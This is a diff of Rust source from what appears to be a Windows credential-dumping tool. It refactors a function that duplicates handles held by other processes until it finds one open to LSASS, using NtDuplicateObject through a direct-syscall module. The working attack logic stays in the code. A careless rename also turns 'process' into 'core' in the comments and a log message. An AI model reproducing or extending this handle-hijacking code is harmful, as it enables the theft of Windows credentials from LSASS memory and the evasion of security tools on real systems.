@@ -1,14 +1,12 @@
-use std::process::exit;
-use log::{info, trace, warn, error, debug};
+use log::{debug, trace, warn};
 
-use windows::Win32::Foundation::HANDLE;
-use crate::core::handle::{get_extended_handle_info, get_type_index_by_name, HANDLES, HANDLE_TYPES, TYPE_INDEX_TABLE};
-use crate::core::permission::get_lsass_min_permissions;
-use crate::core::process::{get_all_process_except};
-use crate::nt::ntdll::{NtDuplicateObject};
-use crate::nt::status::nt_success;
-use crate::nt::system::{get_process_handle, NtOpenProcessAccess};
+use crate::core::handle::{get_extended_handle_info, get_type_index_by_name, HANDLES, HandleTypes};
+use crate::core::process::get_all_process_except;
+use crate::utils::utils::nt_success;
+use crate::syscall::system::{get_process_handle, NtOpenProcessAccess};
+use crate::syscall::syscalls::NtDuplicateObject;
 use crate::utils::utils::is_lsass;
+use windows::Win32::Foundation::HANDLE;
 
 const NT_CURRENT_PROCESS: HANDLE = HANDLE(-1isize as *mut core::ffi::c_void);
 
@@ -40,24 +38,24 @@ pub fn duplicate_lsass_handle(lsass_pid: u32, permissions: u32, attributes: u32)
 
     unsafe {
         if let Some(handles) = &HANDLES {
-            let process_type_index = get_type_index_by_name(HANDLE_TYPES::PROCESS_HANDLE_TYPE)?;
+            let process_type_index = get_type_index_by_name(HandleTypes::PROCESS_HANDLE_TYPE)?;
 
             for process in get_all_process_except(lsass_pid as usize) {
 
                 let mut hprocess : Option<HANDLE> = None;
 
                 for handle in handles.iter() {
-                    // Make sure the handle is for the looking process
+                    // Make sure the handle is for the looking core
                     if handle.unique_process_id != process.pid { continue; }
 
-                    // Make sure the handle is a process handle
+                    // Make sure the handle is a core handle
                     if handle.object_type_index as u32 != process_type_index { continue; }
 
                     // Make sure the handle has the right permissions
                     if handle.granted_access & permissions != permissions { continue; }
 
                     if hprocess.is_none() {
-                        // open a handle to the process with PROCESS_DUP_HANDLE
+                        // open a handle to the core with PROCESS_DUP_HANDLE
                         hprocess = get_process_handle(process.pid, NtOpenProcessAccess::PROCESS_DUP_HANDLE, 0);
                         if hprocess.is_none() {
                             break
@@ -86,7 +84,7 @@ pub fn duplicate_lsass_handle(lsass_pid: u32, permissions: u32, attributes: u32)
                     debug!("Dumped handle: {:?} for PID: {}", hDuped, process.pid);
 
                     if is_lsass(hDuped) {
-                        debug!("LSASS handle dumped successfully : handle {:?}, process {}", handle.handle_value, process.pid);
+                        debug!("LSASS handle dumped successfully : handle {:?}, core {}", handle.handle_value, process.pid);
                         return Some(hDuped)
                     }
 
